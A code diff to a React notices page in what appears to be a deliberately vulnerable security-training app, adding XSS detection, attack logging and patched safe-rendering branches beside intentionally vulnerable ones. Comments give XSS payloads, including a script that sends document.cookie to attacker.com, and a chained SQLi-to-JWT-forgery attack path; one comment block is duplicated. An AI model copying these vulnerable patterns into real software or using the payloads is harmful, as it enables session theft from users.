@@ -6,6 +6,9 @@
 
 import { useEffect, useState } from "react";
 import Navbar from "@/components/Navbar";
+import { logRealAttack } from "@/lib/logAttack";
+import { usePatchedVulns } from "@/hooks/useCampusDefense";
+import { PatchedBanner } from "@/components/PatchedBanner";
 
 interface Notice {
   id: number;
@@ -23,6 +26,7 @@ export default function NoticesPage() {
   // VULNERABILITY: debug flag read directly from URL — ?debug=true exposes raw API dump
   const [debugMode, setDebugMode]   = useState(false);
   const [rawApiDump, setRawApiDump] = useState<any>(null);
+  const patchedVulns = usePatchedVulns();
 
   useEffect(() => {
     // VULNERABILITY: client-side URL param enables debug features
@@ -34,7 +38,17 @@ export default function NoticesPage() {
     fetch("/api/notices")
       .then(r => r.json())
       .then(d => {
-        setNotices(d.notices || []);
+        const fetchedNotices = d.notices || [];
+        setNotices(fetchedNotices);
+        
+        fetchedNotices.forEach((n: any) => {
+          if (/<script|onerror|javascript:/i.test(n.content + n.title + n.author)) {
+            if (!patchedVulns.has("xss_notices")) {
+              logRealAttack({ type: "xss_notices", severity: "critical", detail: "XSS payload detected in stored notice", endpoint: "/notices", payload: n.content });
+            }
+          }
+        });
+
         // VULNERABILITY: entire raw API response stored and rendered in debug mode
         // exposes internal object structure, field names, and notice count
         setRawApiDump(d);
@@ -45,11 +59,21 @@ export default function NoticesPage() {
     // Attack: /notices#<img src=x onerror=alert(document.cookie)>
     const hash = window.location.hash.slice(1);
     if (hash) {
+      if (/<script|onerror|javascript:/i.test(decodeURIComponent(hash))) {
+        if (!patchedVulns.has("xss_dom")) {
+          logRealAttack({ type: "xss_dom", severity: "high", detail: "DOM-based XSS via URL hash", endpoint: "/notices", payload: decodeURIComponent(hash) });
+        }
+      }
       setTimeout(() => {
         const filterEl = document.getElementById("filter-display");
         if (filterEl) {
-          // VULNERABILITY: innerHTML set from URL hash — DOM-based XSS
-          filterEl.innerHTML = `Filtered by: ${decodeURIComponent(hash)}`;
+          if (patchedVulns.has("xss_dom")) {
+            // Patched: use safe textContent instead of innerHTML
+            filterEl.textContent = `Filtered by: ${decodeURIComponent(hash)}`;
+          } else {
+            // VULNERABILITY: innerHTML set from URL hash — DOM-based XSS
+            filterEl.innerHTML = `Filtered by: ${decodeURIComponent(hash)}`;
+          }
         }
       }, 100);
     }
@@ -143,18 +167,30 @@ export default function NoticesPage() {
 
           {/* VULNERABILITY: Reflected XSS — filter value injected raw into DOM via dangerouslySetInnerHTML
               Renders ALWAYS even when no notices match — XSS fires immediately on any input.
+          {/* VULNERABILITY: Reflected XSS — filter value injected raw into DOM via dangerouslySetInnerHTML
+              Renders ALWAYS even when no notices match — XSS fires immediately on any input.
               Attack: type  <img src=x onerror=alert(document.cookie)>  in the search box */}
           {filter && (
             <div style={{ marginBottom:14, paddingLeft:4 }}>
-              <p
-                className="font-mono"
-                style={{ fontSize:11, color:"var(--cc-text-muted)", margin:0 }}
-                dangerouslySetInnerHTML={{
-                  __html: `Searching bulletins for: <span style="color:var(--cc-orange);font-weight:700">${filter}</span>`
-                }}
-              />
+              {patchedVulns.has("xss_notices") ? (
+                <p className="font-mono" style={{ fontSize:11, color:"var(--cc-text-muted)", margin:0 }}>
+                  Searching bulletins for: <span style={{ color:"var(--cc-orange)", fontWeight:700 }}>{filter}</span>
+                </p>
+              ) : (
+                <p
+                  className="font-mono"
+                  style={{ fontSize:11, color:"var(--cc-text-muted)", margin:0 }}
+                  dangerouslySetInnerHTML={{
+                    __html: `Searching bulletins for: <span style="color:var(--cc-orange);font-weight:700">${filter}</span>`
+                  }}
+                />
+              )}
             </div>
           )}
+
+          {/* Patch banners */}
+          {patchedVulns.has("xss_notices") && <PatchedBanner label="XSS — NOTICE BOARD" />}
+          {patchedVulns.has("xss_dom") && <PatchedBanner label="XSS — DOM / HASH" />}
 
           <div id="filter-display" className="text-sm text-gray-500 mb-4" />
 
@@ -177,6 +213,7 @@ export default function NoticesPage() {
                   onToggle={() => setExpandedId(expandedId === n.id ? null : n.id)}
                   highlight={filter}
                   highlightFn={highlightMatch}
+                  isXssPatched={patchedVulns.has("xss_notices")}
                 />
               ))
             )}
@@ -203,13 +240,14 @@ export default function NoticesPage() {
 // ── Sub-components ──────────────────────────────────────────────────────────
 
 function NoticeCard({
-  notice, isExpanded, onToggle, highlight, highlightFn,
+  notice, isExpanded, onToggle, highlight, highlightFn, isXssPatched,
 }: {
   notice: Notice;
   isExpanded: boolean;
   onToggle: () => void;
   highlight: string;
   highlightFn: (text: string, query: string) => string;
+  isXssPatched?: boolean;
 }) {
   const isNew = (Date.now() - new Date(notice.created_at).getTime()) < 86400000 * 3;
 
@@ -230,28 +268,41 @@ function NoticeCard({
       <button onClick={onToggle} style={{ width:"100%", textAlign:"left", padding:"14px 18px", background:"none", border:"none", cursor:"pointer", display:"flex", alignItems:"center", gap:14 }}>
         <div style={{ flex:1, minWidth:0 }}>
           <div style={{ display:"flex", alignItems:"center", gap:8, marginBottom:4, flexWrap:"wrap" }}>
-            {/* VULNERABILITY: Reflected XSS via dangerouslySetInnerHTML
-                The highlight function injects the raw search input into the DOM as HTML
-                Attack: type this in the search box:
-                <img src=x onerror=alert(document.cookie)>
-                The onerror fires on every matching notice title render */}
-            <h3
-              style={{ fontSize:14, fontWeight:800, color:"var(--cc-navy)", margin:0, overflow:"hidden", textOverflow:"ellipsis", whiteSpace:"nowrap" }}
-              dangerouslySetInnerHTML={{ __html: highlightFn(notice.title, highlight) }}
-            />
+            {isXssPatched ? (
+              /* PATCHED: safe text rendering — no HTML injection possible */
+              <h3 style={{ fontSize:14, fontWeight:800, color:"var(--cc-navy)", margin:0, overflow:"hidden", textOverflow:"ellipsis", whiteSpace:"nowrap" }}>
+                {notice.title}
+              </h3>
+            ) : (
+              /* VULNERABILITY: Reflected XSS via dangerouslySetInnerHTML
+                 The highlight function injects the raw search input into the DOM as HTML
+                 Attack: type this in the search box:
+                 <img src=x onerror=alert(document.cookie)>
+                 The onerror fires on every matching notice title render */
+              <h3
+                style={{ fontSize:14, fontWeight:800, color:"var(--cc-navy)", margin:0, overflow:"hidden", textOverflow:"ellipsis", whiteSpace:"nowrap" }}
+                dangerouslySetInnerHTML={{ __html: highlightFn(notice.title, highlight) }}
+              />
+            )}
             {isNew && (
               <span style={{ fontSize:9, fontWeight:800, background:"rgba(22,163,74,0.1)", color:"#16a34a", border:"1px solid rgba(22,163,74,0.2)", padding:"1px 6px", borderRadius:20, textTransform:"uppercase", flexShrink:0 }}>New</span>
             )}
           </div>
           <div style={{ display:"flex", alignItems:"center", gap:8 }}>
-            {/* VULNERABILITY: Stored XSS surface — author field rendered as raw HTML
-                If an attacker can control the author field (e.g. via forged admin JWT
-                posting a notice), any HTML in the author name executes here
-                Attack: POST /api/admin/notices with author containing <script>...</script> */}
-            <span
-              style={{ fontSize:11, fontWeight:700, background: accent+"18", color:accent, border:`1px solid ${accent}30`, padding:"1px 8px", borderRadius:20 }}
-              dangerouslySetInnerHTML={{ __html: notice.author }}
-            />
+            {isXssPatched ? (
+              /* PATCHED: safe span for author */
+              <span style={{ fontSize:11, fontWeight:700, background: accent+"18", color:accent, border:`1px solid ${accent}30`, padding:"1px 8px", borderRadius:20 }}>
+                {notice.author}
+              </span>
+            ) : (
+              /* VULNERABILITY: Stored XSS surface — author field rendered as raw HTML
+                 If an attacker can control the author field (e.g. via forged admin JWT
+                 posting a notice), any HTML in the author name executes here */
+              <span
+                style={{ fontSize:11, fontWeight:700, background: accent+"18", color:accent, border:`1px solid ${accent}30`, padding:"1px 8px", borderRadius:20 }}
+                dangerouslySetInnerHTML={{ __html: notice.author }}
+              />
+            )}
             <span style={{ fontSize:11, color:"var(--cc-text-muted)" }}>{new Date(notice.created_at).toLocaleDateString("en-IN")}</span>
           </div>
         </div>
@@ -261,15 +312,21 @@ function NoticeCard({
       {isExpanded && (
         <div style={{ padding:"0 18px 16px 18px", borderTop:"1px solid var(--cc-border)" }}>
           <div style={{ paddingTop:14 }}>
-            {/* VULNERABILITY: Stored XSS — notice content rendered as raw HTML
-                An admin (or attacker with forged admin JWT) can POST a notice with:
-                content: "<script>document.location='https://attacker.com?c='+document.cookie</script>"
-                This executes for every user who expands that notice
-                Combined attack: SQLi login → JWT forge → POST malicious notice → steal all session cookies */}
-            <p
-              style={{ fontSize:13, color:"var(--cc-text)", lineHeight:1.7, margin:0 }}
-              dangerouslySetInnerHTML={{ __html: highlightFn(notice.content, highlight) }}
-            />
+            {isXssPatched ? (
+              /* PATCHED: safe text rendering for content */
+              <p style={{ fontSize:13, color:"var(--cc-text)", lineHeight:1.7, margin:0 }}>
+                {notice.content}
+              </p>
+            ) : (
+              /* VULNERABILITY: Stored XSS — notice content rendered as raw HTML
+                 An admin (or attacker with forged admin JWT) can POST a notice with:
+                 content: "<script>document.location='https://attacker.com?c='+document.cookie</script>"
+                 This executes for every user who expands that notice */
+              <p
+            style={{ fontSize:13, color:"var(--cc-text)", lineHeight:1.7, margin:0 }}
+                dangerouslySetInnerHTML={{ __html: highlightFn(notice.content, highlight) }}
+              />
+            )}
           </div>
         </div>
       )}
